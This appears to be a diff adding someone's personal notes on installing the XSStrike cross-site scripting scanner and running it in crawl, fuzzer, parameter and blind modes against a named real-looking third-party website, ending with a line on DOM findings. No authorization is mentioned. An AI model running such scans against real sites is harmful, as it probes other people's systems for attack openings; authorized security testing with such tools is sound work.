@@ -1,0 +1,39 @@
+XSSTRIKE
+
+//
+Installation, ensure you are root.
+git clone https://github.com/s0md3v/XSStrike.git
+
+//change directory
+cd XSStrike
+
+//install pip //an error encountered is failed to install fuzzywuzzy
+
+apt-get install pip
+
+
+//run commands--> Ensure you have python3
+
+sudo python3 xsstrike.py 
+
+
+@/home/aiko/XSStrike# sudo python3 xsstrike.py -u https://carechoice.elmotalent.com.au/ --crawl
+
+
+@/home/aiko/XSStrike# sudo python3 xsstrike.py -u https://carechoice.elmotalent.com.au/ --fuzzer
+
+
+@/home/aiko/XSStrike# sudo python3 xsstrike.py -u https://carechoice.elmotalent.com.au/search?q=forgotpassword --fuzzer
+
+
+@/home/aiko/XSStrike# sudo python3 xsstrike.py -u https://carechoice.elmotalent.com.au/ --params
+
+
+@/home/aiko/XSStrike# sudo python3 xsstrike.py -u https://carechoice.elmotalent.com.au/ --json
+
+
+@/home/aiko/XSStrike# sudo python3 xsstrike.py -u https://carechoice.elmotalent.com.au/ --blind
+
+
+
+//DOM vulnerabilities found: instanceof, setImmediate,  
